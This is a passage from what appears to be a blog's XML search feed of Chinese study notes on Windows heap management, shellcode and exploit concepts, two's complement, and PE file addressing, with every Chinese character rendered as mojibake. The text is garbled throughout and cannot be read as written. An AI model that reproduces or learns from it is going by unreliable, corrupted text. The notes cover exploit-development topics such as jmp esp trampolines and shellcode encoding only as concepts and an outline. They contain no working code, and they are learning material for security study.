†ä¼šç”¨äºŽåˆ†é…ã€‚è¿™ç§æ¬¡ä¼˜åˆ†é…å‘ç”Ÿæ—¶ï¼Œä¼šå…ˆä»Žå¤§å—ä¸­æŒ‰ç…§è¯·æ±‚çš„å¤§å°ç²¾å‡†åœ°å‰²å‡ºä¸€å—è¿›è¡Œåˆ†é…ï¼Œç„¶åŽå‰©ä¸‹çš„éƒ¨åˆ†é‡æ–°åˆ†é…å—é¦–ï¼Œé“¾å…¥ç©ºè¡¨ï¼Œå†æ¬¡å¯ä»¥è¢«ç´¢å¼•åˆ°ã€‚ æ­¤å¤„æ²¡æœ‰è€ƒè™‘å †ç¼“å­˜(heap cache)ï¼Œä½Žç¢Žç‰‡å †(LFH)ä¸Žè™šåˆ†é…ã€‚ å †å—é‡Šæ”¾å †å—é‡Šæ”¾çš„æ“ä½œåŒ…æ‹¬å°†å †å—çŠ¶æ€æ”¹ä¸ºç©ºé—²ï¼Œé“¾å…¥ç›¸åº”çš„å †è¡¨ã€‚æ‰€æœ‰é‡Šæ”¾å—éƒ½é“¾å…¥å †è¡¨çš„æœ«å°¾ï¼Œåˆ†é…çš„æ—¶å€™ä¹Ÿä»Žå †è¡¨æœ«å°¾æ‹¿ã€‚ç‰¹æ®Šå¼ºè°ƒï¼šå¿«è¡¨æœ€å¤šæœ‰4é¡¹ã€‚ å †å—åˆå¹¶ç»è¿‡åå¤çš„ç”³è¯·ä¸Žé‡Šæ”¾æ“ä½œï¼Œå†…å­˜ä¸­çš„å †åŒºå¯èƒ½ä¼šäº§ç”Ÿå¾ˆå¤šå†…å­˜ç¢Žç‰‡ã€‚ä¸ºäº†åˆç†æœ‰æ•ˆåœ°åˆ©ç”¨å†…å­˜ï¼Œå †ç³»ç»Ÿè¿˜èƒ½å¤Ÿè¿›è¡Œå †å—åˆå¹¶æ“ä½œï¼šå½“å †ç®¡ç†ç³»ç»Ÿå‘çŽ°ä¸¤ä¸ªå †å—ç›¸é‚»çš„æ—¶å€™ï¼Œå°±ä¼šè¿›è¡Œå †å—åˆå¹¶æ“ä½œã€‚ å †å—åˆå¹¶åŒ…æ‹¬å°†ä¸¤ä¸ªå—ä»Žç©ºé—²é“¾è¡¨ä¸­å¸ä¸‹ï¼Œåˆå¹¶å †å—ï¼Œè°ƒæ•´åˆå¹¶åŽå¤§å—çš„å—é¦–ä¿¡æ¯ï¼Œå°†æ–°å—é‡æ–°é“¾å…¥ç©ºé—²é“¾è¡¨ã€‚å¹¶ä¸”å¯¹äºŽå°äºŽ1KBçš„å°å—ï¼Œå¤§äºŽç­‰äºŽ1KBå°äºŽ512KBçš„å¤§å—ï¼Œå¤§äºŽç­‰äºŽ512KBçš„å·¨å—ï¼Œæœ‰ä¸åŒçš„åˆ†é…ä¸Žé‡Šæ”¾çš„ç®—æ³•ï¼Œæ­¤å¤„ä¸åšæ·±å…¥äº†è§£ï¼ŒäºŒå‘¨ç›®çš„æ—¶å€™å†è°ƒè¯•ã€‚ å †åˆ†é…å‡½æ•°ä¹‹é—´çš„è°ƒç”¨å…³ç³»Windowsä¸­è®¸å¤šç±»åž‹çš„å †åˆ†é…å‡½æ•°æœ€ç»ˆéƒ½å°†ä½¿ç”¨ä½äºŽntdll.dllä¸­çš„RtlAllocateHeap()å‡½æ•°è¿›è¡Œåˆ†é…ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯åœ¨ç”¨æˆ·æ€èƒ½å¤Ÿçœ‹åˆ°çš„æœ€åº•å±‚çš„å †åˆ†é…å‡½æ•°ã€‚ è°ƒè¯•å †çš„æ–¹æ³•è°ƒè¯•æ ˆä¸åŒï¼Œè°ƒè¯•å †æ—¶å¦‚æžœç›´æŽ¥ç”¨ODï¼ŒWindbgåŠ è½½ç¨‹åºï¼Œä¼šè¢«å †ç®¡ç†å‡½æ•°æ£€æµ‹åˆ°å½“å‰è¿›ç¨‹å¤„äºŽè°ƒè¯•çŠ¶æ€ã€‚è€Œä½¿ç”¨è°ƒè¯•æ€çš„å †ç®¡ç†ç­–ç•¥ï¼Œè°ƒè¯•æ€çš„å †ç®¡ç†ä¸Žå¸¸æ€çš„å †ç®¡ç†æœ‰å¾ˆå¤§å·®å¼‚ï¼š è°ƒè¯•æ€å †ä¸é€‚ç”¨å¿«è¡¨ï¼Œåªä½¿ç”¨ç©ºè¡¨åˆ†é…(æˆ‘çŸ¥é“è¿™åªæ˜¯æ¼”ä¹ )ã€‚ æ‰€æœ‰çš„å †å—éƒ½è¢«åŠ ä¸Šäº†å¤šä½™çš„16å­—èŠ‚å°¾éƒ¨(8ä¸ªå­—èŠ‚çš„0xABä¸Ž8ä¸ªå­—èŠ‚çš„0x00)ç”¨æ¥é˜²æ­¢æº¢å‡º(é˜²æ­¢ç¨‹åºæº¢å‡ºè€Œéžå †æº¢å‡ºæ”»å‡»)ã€‚ å—é¦–çš„æ ‡å¿—ä¸åŒã€‚ Debugç‰ˆæœ¬ä¸ŽReleaseç‰ˆæœ¬çš„åŒºåˆ« Debugé€šå¸¸ç§°ä¸ºè°ƒè¯•ç‰ˆæœ¬ï¼Œé€šè¿‡ä¸€ç³»åˆ—ç¼–è¯‘é€‰é¡¹çš„é…åˆï¼Œç¼–è¯‘çš„ç»“æžœé€šå¸¸åŒ…å«è°ƒè¯•ä¿¡æ¯ï¼Œä½†æ˜¯ä¸åšä»»ä½•ä¼˜åŒ–ï¼ˆæ€§èƒ½æœ‰å½±å“ï¼‰ï¼Œç›®çš„æ˜¯ä¸ºå¼€å‘äººå‘˜æä¾›å¼ºå¤§çš„åº”ç”¨ç¨‹åºè°ƒè¯•èƒ½åŠ›ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰åœ¨Debugæ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬æ‰å¯ä»¥ä½¿ç”¨vsæ‰€æä¾›çš„æ‰€æœ‰çš„ç¨‹åºè°ƒè¯•åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šå•æ­¥è°ƒè¯•ä¸­å°†å…‰æ ‡ç§»è‡³å˜é‡å¤„å³å¯ä»¥èŽ·å–è¯¥å˜é‡çš„å®žæ—¶æ•°æ®ã€‚ Releaseé€šå¸¸ç§°ä¸ºå‘å¸ƒç‰ˆæœ¬ï¼Œæ˜¯ä¸ºç”¨æˆ·ä½¿ç”¨çš„ï¼Œä¸€èˆ¬å®¢æˆ·ä¸å…è®¸åœ¨å‘å¸ƒç‰ˆæœ¬ä¸Šè¿›è¡Œè°ƒè¯•ï¼Œåœ¨Releaseæ¨¡å¼ä¸‹ä¹Ÿæ— æ³•ä½¿ç”¨vsæ‰€æœ‰çš„è°ƒè¯•åŠŸèƒ½ã€‚æ‰€ä»¥ä¸ä¿å­˜è°ƒè¯•ä¿¡æ¯ï¼ŒåŒæ—¶ï¼Œå®ƒå¾€å¾€è¿›è¡Œäº†å„ç§ä¼˜åŒ–ï¼Œä»¥æœŸè¾¾åˆ°ä»£ç æœ€å°å’Œé€Ÿåº¦æœ€ä¼˜ã€‚ä¸ºç”¨æˆ·çš„ä½¿ç”¨æä¾›ä¾¿åˆ©ã€‚ è°ƒè¯•æ€çš„å †å°±åƒdebugç‰ˆæœ¬çš„PE,å¸¸æ€å †å°±åƒreleaseç‰ˆæœ¬çš„PEï¼Œä¸ºäº†é¿å…ç¨‹åºæ£€æµ‹å‡ºè°ƒè¯•å™¨è€Œä½¿ç”¨è°ƒè¯•æ€å †ç®¡ç†ç­–ç•¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åˆ›å»ºå †ä¹‹åŽåŠ å…¥ä¸€ä¸ªäººå·¥æ–­ç‚¹:_asm int 3,ç„¶åŽè®©ç¨‹åºå•ç‹¬æ‰§è¡Œã€‚ç¨‹åºæŠŠå †åˆå§‹åŒ–åŽï¼Œå†ç”¨è°ƒè¯•å™¨attachè¿›ç¨‹ï¼Œå°±èƒ½å¤Ÿçœ‹åˆ°çœŸå®žçš„å †ã€‚ã€ å †åˆ†é…ç®—æ³•ä¾èµ–äºŽæ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨ç‰ˆæœ¬ï¼Œç¼–è¯‘é€‰é¡¹ï¼Œbulidç±»åž‹ç­‰å› ç´ ï¼Œç”šè‡³ä¸Žè™šæ‹Ÿæœºç‰ˆæœ¬æœ‰å…³ã€‚å®žéªŒçŽ¯å¢ƒä¸æ°å½“ï¼Œå°†å¾—åˆ°ä¸åŒçš„è°ƒè¯•ç»“æžœã€‚éš¾æžå•Š]]></content>
      <tags>
        <tag>0dayå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¼€å‘shellcodeçš„è‰ºæœ¯]]></title>
    <url>%2F2019%2F09%2F08%2F%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[Shellcode:ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ä¸­æ¤å…¥è¿›ç¨‹çš„ä»£ç  Exploit:è®¡ç®—å‡½æ•°è¿”å›žåœ°å€è·ç¦»ç¼“å†²åŒºçš„åç§»å¹¶è¦†ç›–ï¼Œé€‰æ‹©æŒ‡ä»¤çš„åœ°å€ï¼Œæœ€ç»ˆåˆ¶ä½œå‡ºä¸€ä¸ªç”±æ”»å‡»æ•ˆæžœï¼Œæ‰¿è½½ç€shellcodeçš„è¾“å…¥å­—ç¬¦ä¸²ä½Exploitã€‚ exploitä¸€èˆ¬ä»¥ä¸€æ®µä»£ç çš„å½¢å¼å‡ºçŽ°ï¼Œç”¨äºŽç”Ÿæˆæ”»å‡»æ€§çš„ç½‘ç»œæ•°æ®åŒ…æˆ–è€…å…¶ä»–è¾“å…¥ï¼Œå…¶æ ¸å¿ƒæ˜¯æ·¹æ²¡è¿”å›žåœ°å€ï¼ŒåŠ«æŒè¿›ç¨‹çš„æŽ§åˆ¶æƒï¼Œä¹‹åŽè·³è½¬åŽ»æ‰§è¡Œshellcodeã€‚ä¸Žshellcodeä¸€å®šçš„é€šç”¨æ€§ä¸åŒï¼Œexploitä¸€èˆ¬æ˜¯é’ˆå¯¹ç‰¹å®šæ¼æ´žçš„ã€‚ Metasploité€šç”¨æ¼æ´žæµ‹è¯•å¹³å°ï¼šè§„èŒƒåŒ–exploitå’Œshellcodeä¹‹é—´çš„æŽ¥å£ï¼ŒæŠŠæ¼æ´žåˆ©ç”¨çš„è¿‡ç¨‹å°è£…æˆæ˜“ç”¨çš„æ¨¡å—ï¼Œå®žçŽ°äº†ä»£ç é‡å¤åˆ©ç”¨å’Œæ¨¡å—åŒ–ï¼Œç»“æž„åŒ–çš„æ€æƒ³ã€‚åœ¨è¿™ä¸ªå¹³å°ä¸­ï¼š æ‰€æœ‰çš„exploitéƒ½ä½¿ç”¨æ¼æ´žåç§°æ¥å‘½åï¼Œé‡Œé¢åŒ…å«æœ‰è¿™ä¸ªæ¼æ´žçš„å‡½æ•°è¿”å›žåœ°å€ï¼Œæ‰€ä½¿ç”¨çš„è·³è½¬æŒ‡ä»¤ç­‰å…³é”®ä¿¡æ¯ã€‚ å°†å¸¸ç”¨çš„shellcode(ä¾‹å¦‚ç”¨äºŽç»‘å®šç«¯å£åå‘è¿žæŽ¥ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤)å°è£…æˆä¸€ä¸ªä¸ªé€šç”¨çš„æ¨¡å—ï¼Œä¸Žä»»æ„æ¼æ´žçš„Exploitè¿›è¡Œç»„åˆã€‚ ä»Šå¤©ç”µè„‘ä¸æ˜¯ä¸€èˆ¬åœ°å¡ï¼Œç¬¬äºŒç« è¯¥è°ƒè¯•çš„æ“ä½œéƒ½è¿˜æ²¡ç»ƒä¹ è¿‡ï¼Œè¿™å¯¹äºŽå­¦ä¹ æ¥è¯´æ˜¯éžå¸¸å±é™©çš„ï¼Œç¬¬ä¸‰ç« shellcodeå¼€å‘ä¹Ÿå¾—é™ä¸‹å¿ƒç ”ç©¶ã€‚ 0X00:å®šä½shellcode æ ˆå¸§ç§»ä½ä¸Žjmp esp èŽ·å–è·³æ¿åœ°å€ ä½¿ç”¨è·³æ¿å®šä½exploit 0X01:ç¼“å†²åŒºçš„ç»„ç»‡ ç¼“å†²åŒºçš„ç»„æˆ æŠ¬é«˜æ ˆé¡¶ä¿æŠ¤shellcode ä½¿ç”¨å…¶ä»–è·³è½¬æŒ‡ä»¤ ä¸ä½¿ç”¨è·³è½¬æŒ‡ä»¤ å‡½æ•°è¿”å›žåœ°å€ç§»ä½ 0X02:å¼€å‘é€šç”¨çš„shellcode å®šä½APIçš„åŽŸç† shellcodeçš„åŠ è½½ä¸Žè°ƒè¯• åŠ¨æ€å®šä½APIåœ°å€çš„shellcode 0X03ï¼šshellcodeç¼–ç æŠ€æœ¯ ä¸ºä»€ä¹ˆè¦å¯¹shellcodeç¼–ç  ä¼šå˜å½¢çš„shellcode 0X04:ç®€åŒ–shellcode]]></content>
      <tags>
        <tag>0dayå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®¡ç®—æœºåŸºç¡€çŸ¥è¯†]]></title>
    <url>%2F2019%2F09%2F08%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[æ•°çš„å­˜å‚¨ä¸€ç›´å¯¹è®¡ç®—æœºä¸­æ•°çš„å­˜å‚¨æ–¹å¼ä¸€çŸ¥åŠè§£ï¼Œmake a summary todayã€‚ sourceï¼šä¸ºä»€ä¹ˆ-1åœ¨è®¡ç®—æœºä¸­çš„å­˜å‚¨æ˜¯0XFFFFFFFF? è´Ÿæ•´æ•°ç”¨è¡¥ç (Twoâ€™s-complement)è¡¨ç¤ºçš„æ•°å­¦åŽŸç†æ˜¯:ä¸€ä¸ªæ•´æ•°çš„è¡¥ç æ˜¯å…¶åŠ æ³•é€†å…ƒï¼ˆå¦‚æžœå°†ä¸€ä¸ªæ•°ä¸Žå…¶åŠ æ³•é€†å…ƒç›¸åŠ ï¼Œå…¶ç»“æžœä¸º0ï¼‰ã€‚ 0X00:åŽŸç ï¼Œåç ï¼Œè¡¥ç åŽŸç è¡¨ç¤ºæ³•è§„å®šï¼šç”¨ç¬¦å·ä½å’Œæ•°å€¼ä½ä¸¤éƒ¨åˆ†è¡¨ç¤ºä¸€ä¸ªå¸¦ç¬¦å·æ•°ï¼Œè®¾å­—é•¿ä¸ºnä½ï¼Œæœ€é«˜ä½ä¸ºç¬¦å·ä½ï¼Œæ­£æ•°çš„ç¬¦å·ä½ç”¨0è¡¨ç¤ºï¼Œè´Ÿæ•°çš„ç¬¦å·ä½ç”¨1è¡¨ç¤ºã€‚å…¶ä½™n-1ä½æ•°å€¼éƒ¨åˆ†ç”¨äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºã€‚åœ¨åŽŸç ä¸­ï¼Œé›¶æœ‰ä¸¤ç§è¡¨ç¤ºå½¢å¼ï¼Œ00000000ä¸º+0ï¼Œ10000000ä¸º-0. åŽŸç æ‰€èƒ½è¡¨ç¤ºçš„æ•°çš„èŒƒå›´ä¸ŽäºŒè¿›åˆ¶çš„ä½æ•°(å³æœºå™¨å­—é•¿)æœ‰å…³ï¼Œç”±8ä½äºŒè¿›åˆ¶æ•°è¡¨ç¤ºåˆ°ç”±16ä½äºŒè¿›åˆ¶æ•°è¡¨ç¤ºï¼Œèƒ½å¤Ÿè¡¨ç¤ºçš„èŒƒå›´ä¼šå¢žå¤§ã€‚ åç è¡¨ç¤ºæ³•è§„å®šï¼šæ­£æ•°çš„åç ä¸ŽåŽŸç ç›¸åŒï¼Œè´Ÿæ•°çš„åç æ˜¯å¯¹è¯¥æ•°çš„åŽŸç é™¤ç¬¦å·ä½å¤–å„ä½å–åã€‚ è¡¥ç è¡¨ç¤ºæ³•è§„å®šï¼šæ­£æ•°çš„è¡¥ç ä¸ŽåŽŸç ç›¸åŒï¼Œè´Ÿæ•°çš„è¡¥ç æ˜¯å¯¹è¯¥æ•°çš„åŽŸç é™¤ç¬¦å·ä½å¤–å„ä½å–ååŽæœ€æœ«ä½+1.åå…­è¿›åˆ¶æ•°çš„è¡¥ç ï¼Œå°±æ˜¯å°†ä¸€ä¸ªåå…­è¿›åˆ¶æ•´æ•°æŒ‰ä½å–åå¹¶+1.ç®€å•çš„æ–¹æ³•å°±æ˜¯ç”¨15å‡åŽ»è¯¥æ•°å­—ï¼Œæœ€åŽå†+1. é›¶çš„è¡¥ç æ˜¯å”¯ä¸€çš„ï¼š00000000 è¡¥ç æ‰€èƒ½è¡¨ç¤ºçš„æ•°çš„èŒƒå›´ä¸ŽäºŒè¿›åˆ¶çš„ä½æ•°(å³æœºå™¨å­—é•¿)æœ‰å…³ï¼Œç”±8ä½äºŒè¿›åˆ¶æ•°è¡¨ç¤ºåˆ°ç”±16ä½äºŒè¿›åˆ¶æ•°è¡¨ç¤ºï¼Œèƒ½å¤Ÿè¡¨ç¤ºçš„èŒƒå›´ä¼šå¢žå¤§ã€‚ ä»»ä½•ä¸€ä¸ªæ•°çš„è¡¥ç çš„è¡¥ç å³æ˜¯å…¶åŽŸç æœ¬èº«ã€‚ å‡ ç§è¿›åˆ¶ï¼ˆæœ‰ç¬¦å·/æ— ç¬¦å·ä¹‹é—´çš„è½¬æ¢ï¼‰æœ‰ç¬¦å·äºŒè¿›åˆ¶æ•´æ•°åˆ°åè¿›åˆ¶çš„è½¬æ¢å¦‚æžœæœ€é«˜ä½æ˜¯1ï¼Œåˆ™è¯¥æ•°æ˜¯è¡¥ç ï¼Œå†æ¬¡å¯¹å…¶æ±‚è¡¥ï¼Œå¾—åˆ°å…¶æ­£æ•°å€¼ã€‚ç„¶åŽæŠŠè¿™ä¸ªæ•°çœ‹æˆä¸€ä¸ªæ— ç¬¦å·äºŒè¿›åˆ¶æ•°ï¼Œå¹¶æ±‚å®ƒçš„åè¿›åˆ¶å€¼ã€‚ å¦‚æžœæœ€é«˜ä½æ˜¯0ï¼Œå°±å°†å…¶è§†ä¸ºæ— ç¬¦å·äºŒè¿›åˆ¶æ•´æ•°ï¼Œå¹¶è½¬æ¢ä¸ºåè¿›åˆ¶æ•°ã€‚ ï¼ˆå…ˆè¾¨åˆ«äº†æ˜¯å¦æ˜¯è´Ÿæ•°ï¼‰ æœ‰ç¬¦å·åè¿›åˆ¶æ•°åˆ°äºŒè¿›åˆ¶çš„è½¬æ¢æŠŠåè¿›åˆ¶æ•´æ•°çš„ç»å¯¹å€¼è½¬æ¢æˆäºŒè¿›åˆ¶æ•° å¦‚æžœåˆå§‹åè¿›åˆ¶æ•°æ˜¯è´Ÿæ•°ï¼Œåˆ™åœ¨ç¬¬ä¸€æ­¥çš„åŸºç¡€ä¸Šæ±‚å…¶è¡¥ç ã€‚ ï¼ˆå…ˆæŠŠäºŒè¿›åˆ¶æ•°è¡¨ç¤ºå‡ºæ¥ï¼ˆä¸Žæ•°å­—æ— å…³ï¼‰ï¼Œå†åˆ¤æ–­æ˜¯å¦æ˜¯è´Ÿæ•°ï¼‰ æœ‰ç¬¦å·åè¿›åˆ¶æ•°åˆ°åå…­è¿›åˆ¶çš„è½¬æ¢æŠŠåè¿›åˆ¶æ•´æ•°çš„ç»å¯¹å€¼è½¬æ¢æˆåå…­è¿›åˆ¶æ•° å¦‚æžœåˆå§‹åè¿›åˆ¶æ•°æ˜¯è´Ÿæ•°ï¼Œåˆ™åœ¨ç¬¬ä¸€æ­¥çš„åŸºç¡€ä¸Šæ±‚å…¶è¡¥ç ã€‚ æœ‰ç¬¦å·åå…­è¿›åˆ¶æ•°åˆ°åè¿›åˆ¶çš„è½¬æ¢å¦‚æžœåå…­è¿›åˆ¶æ•´æ•°æ˜¯è´Ÿæ•°ï¼Œæ±‚å…¶è¡¥ç ï¼Œå¦åˆ™ä¿æŒä¸å˜ã€‚ æŠŠç¬¬ä¸€æ­¥å¾—åˆ°çš„æ•°è½¬æ¢æˆåè¿›åˆ¶ã€‚å¦‚æžœåˆå§‹å€¼æ˜¯è´Ÿæ•°ï¼Œåˆ™åœ¨åè¿›åˆ¶æ•°å‰é¢åŠ ä¸Šè´Ÿå·ã€‚ é€šè¿‡æ£€æŸ¥åå…­è¿›åˆ¶æ•°çš„æœ€é«˜æœ‰æ•ˆä½ï¼Œå°±å¯ä»¥çŸ¥é“è¯¥åå…­è¿›åˆ¶æ•°æ˜¯æ­£æ•°è¿˜æ˜¯è´Ÿæ•°ã€‚å¦‚æžœæœ€é«˜ä½&gt;=8,åˆ™è¯¥æ•°æ˜¯è´Ÿæ•°ã€‚å¦‚æžœæœ€é«˜ä½&lt;=7ï¼Œåˆ™è¯¥æ•°æ˜¯æ­£æ•°ã€‚ æ™®éè§„å¾‹ï¼šæ ¹æ®ç¬¦å·æ˜¯å¦å¯¹æ•°å­—äº§ç”Ÿå½±å“ï¼Œè‹¥äº§ç”Ÿå½±å“(è´Ÿæ•°åå…­è¿›åˆ¶/äºŒè¿›åˆ¶ï¼‰ï¼Œæ±‚å…¶è¡¥ç ã€‚è¿›åˆ¶è½¬æ¢åŽå†æ ¹æ®åˆå§‹æ­£è´ŸåŠ ç¬¦å·ã€‚è‹¥ä¸äº§ç”Ÿå½±å“ï¼Œï¼ˆæ­£æ•°åå…­è¿›åˆ¶/äºŒè¿›åˆ¶ï¼Œä»»æ„åè¿›åˆ¶ï¼‰ï¼Œç›´æŽ¥è¿›åˆ¶è½¬æ¢ï¼Œå†çœ‹åˆå§‹æ­£è´Ÿã€‚ å¥æŸ„è¿›ç¨‹åç¨‹]]></content>
      <tags>
        <tag>åº•å±‚</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŸºç¡€çŸ¥è¯†&æ ˆæº¢å‡ºåŽŸç†ä¸Žå®žè·µ]]></title>
    <url>%2F2019%2F09%2F05%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[0X00:åŸºç¡€çŸ¥è¯†PEæ–‡ä»¶æ¦‚è¿°ï¼šPEæ˜¯Win32å¹³å°ä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶éµå®ˆçš„æ•°æ®æ ¼å¼ï¼Œå¸¸è§å¯æ‰§è¡Œæ–‡ä»¶å¦‚.exe/.dlléƒ½å±žäºŽPEæ–‡ä»¶ï¼ŒPEæ–‡ä»¶æ ¼å¼è§„å®šäº†äºŒè¿›åˆ¶çš„æœºå™¨ä»£ç å’Œå­—ç¬¦ä¸²ï¼Œèœå•ï¼Œå›¾æ ‡ç­‰å…¶ä»–ä¿¡æ¯åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­å¦‚ä½•ç»„ç»‡ã€‚ç¨‹åºè¢«æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šæŒ‰ç…§PEæ–‡ä»¶æ ¼å¼çš„çº¦å®šåŽ»å‡†ç¡®åœ°å®šä½å„ç§èµ„æºï¼Œå¹¶å°†å…¶åŠ è½½å…¥å†…å­˜çš„ä¸åŒåŒºåŸŸã€‚ PEæ–‡ä»¶æ ¼å¼æŠŠå¯æ‰§è¡Œæ–‡ä»¶åˆ†å‰²æˆå¤šä¸ªæ•°æ®èŠ‚(section) .textï¼Œç”±ç¼–è¯‘å™¨äº§ç”Ÿï¼Œå­˜æ”¾ç€ç¼–è¯‘äº§ç”Ÿçš„äºŒè¿›åˆ¶æœºå™¨ä»£ç ï¼Œåæ±‡ç¼–å’Œè°ƒè¯•çš„å¯¹è±¡ã€‚ .data,åˆå§‹åŒ–çš„æ•°æ®å—ï¼Œå®å®šä¹‰ï¼Œå…¨å±€å˜é‡ï¼Œé™æ€å˜é‡ã€‚ .idata,æ‰€æ‰§è¡Œçš„åŠ¨æ€é“¾æŽ¥åº“ç­‰å¤–æ¥å‡½æ•°ä¸Žæ–‡ä»¶çš„ä¿¡æ¯ã€‚ .rsrc,å­˜æ”¾ç¨‹åºçš„èµ„æºï¼Œå¦‚å›¾æ ‡ï¼Œèœå•ç­‰ã€‚ è™šæ‹Ÿå†…å­˜ï¼šWindowsçš„ç‰©ç†å†…å­˜æ¯”è¾ƒå¤æ‚ï¼ŒWindowså†…æ ¸Ring0çº§åˆ«æ‰èƒ½çœ‹åˆ°ã€‚é€šå¸¸åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œç”¨è°ƒè¯•å™¨çœ‹åˆ°çš„å†…å­˜éƒ½æ˜¯è™šæ‹Ÿå†…å­˜ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½è¢«åˆ†é…äº†4GBçš„å†…å­˜ç©ºé—´ï¼Œå®žé™…ä¸Šèƒ½å¤Ÿç”¨åˆ°çš„å†…å­˜ç©ºé—´æ²¡æœ‰é‚£ä¹ˆå¤šã€‚å†…å­˜ç®¡ç†å™¨åˆ†é…ç»™äº†è¿›ç¨‹ä¸€ç‰‡å‡åœ°å€/è™šæ‹Ÿåœ°å€ï¼Œåªæœ‰å½“éœ€è¦è¿›è¡Œå®žé™…çš„å†…å­˜æ“ä½œæ—¶ï¼Œå†…å­˜ç®¡ç†å™¨æ‰ä¼šæŠŠè™šæ‹Ÿåœ°å€ä¸Žç‰©ç†åœ°å€è”ç³»èµ·æ¥ã€‚ ä¸€ä¸ª512MBçš„è™šæ‹Ÿå†…å­˜ï¼Œèƒ½å¤Ÿæ˜ å°„å‡ºå‡ ä¸ªè¿›ç¨‹4GBçš„è™šæ‹Ÿå†…å­˜ï¼Œå…³é”®åœ¨äºŽè¿™å‡ ä¸ªè¿›ç¨‹å®žé™…ç”¨åˆ°çš„å†…å­˜ä¹‹å’Œå°äºŽ512MB. PEæ–‡ä»¶ä¸Žè™šæ‹Ÿå†…å­˜ä¹‹é—´çš„æ˜ å°„ï¼š1.é™æ€åæ±‡ç¼–å·¥å…·æ˜¾ç¤ºçš„æŸæ¡æ–‡ä»¶çš„æŒ‡ä»¤æ˜¯ç›¸å¯¹äºŽç£ç›˜æ–‡ä»¶è€Œè¨€çš„ï¼Œå³æ–‡ä»¶åç§»ã€‚æˆ‘ä»¬è¿˜å¯èƒ½æƒ³çŸ¥é“è™šæ‹Ÿå†…å­˜åœ°å€VAã€‚ 2.åŠ¨æ€è°ƒè¯•æ—¶çœ‹åˆ°çš„æŸæ¡æŒ‡ä»¤æ˜¯è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œç»å¸¸éœ€è¦å›žåˆ°PEæ–‡ä»¶æ‰¾åˆ°è¿™æ¡æŒ‡ä»¤çš„æœºå™¨ç ã€‚ å››ä¸ªæ¦‚å¿µï¼šæ³¨æ„æ˜¯åœ¨å†…å­˜ä¸­è¿˜æ˜¯åœ¨PEæ–‡ä»¶ä¸­ 1.æ–‡ä»¶åç§»åœ°å€(File Offset)é™æ€ æ•°æ®åœ¨PEæ–‡ä»¶ä¸­çš„åœ°å€å«åšæ–‡ä»¶åç§»åœ°å€ï¼Œæ˜¯æ–‡ä»¶åœ¨ç£ç›˜ä¸Šå­˜æ”¾æ—¶ï¼Œç›¸å¯¹äºŽæ–‡ä»¶å¼€å¤´çš„åç§»ã€‚ 2.è£…è½½åŸºå€(Image Base)åŠ¨æ€ PEè£…å…¥å†…å­˜ä¸­æ—¶çš„åŸºåœ°å€ï¼Œé»˜è®¤æƒ…å†µä¸‹è£…è½½åŸºå€ä¸º0X00400000ï¼ŒDLLæ–‡ä»¶çš„è£…è½½åŸºå€æ˜¯0X10000000. 3.è™šæ‹Ÿå†…å­˜åœ°å€(Virtual Address)åŠ¨æ€ PEæ–‡ä»¶ä¸­çš„æŒ‡ä»¤è¢«è£…å…¥å†…å­˜ä¹‹åŽçš„åœ°å€ã€‚ 4.ç›¸å¯¹è™šæ‹Ÿåœ°å€(Relative Virtual Adress)åŠ¨æ€ ç›¸å¯¹è™šæ‹Ÿåœ°å€æ˜¯å†…å­˜åœ°å€ç›¸å¯¹äºŽæ˜ å°„åŸºå€çš„åç§»é‡ã€‚ æ‰€ä»¥æœ‰VA=Image Base+RVA é»˜è®¤æƒ…å†µä¸‹å°†PEæ–‡ä»¶çš„0å­—èŠ‚æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜çš„0x00400000ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯è£…è½½åŸºå€ã€‚ æ–‡ä»¶åç§»æ˜¯ç›¸å¯¹äºŽæ–‡ä»¶å¼€å§‹å¤„0å­—èŠ‚çš„åç§»ï¼ŒRVAæ˜¯ç›¸å¯¹äºŽè£…è½½åŸºå€0x00400000çš„åç§»ã€‚ æ“ä½œç³»ç»Ÿåœ¨è£…è½½PEæ–‡ä»¶æ—¶åŸºæœ¬ä¸Šä¿æŒPEæ–‡ä»¶ä¸­çš„å„ç§æ•°æ®ç»“æž„ï¼Œæ‰€ä»¥æ–‡ä»¶åç§»åœ°å€å’ŒRVAç›¸å¯¹è™šæ‹Ÿåœ°å€æœ‰å¾ˆå¤§çš„ä¸€è‡´æ€§ã€‚ä¸å®Œå…¨ä¸€è‡´æ˜¯å› ä¸ºæ–‡ä»¶æ•°æ®çš„å­˜æ”¾å•ä½å’Œå†…å­˜æ•°æ®çš„å­˜æ”¾å•ä½ä¸åŒã€‚ 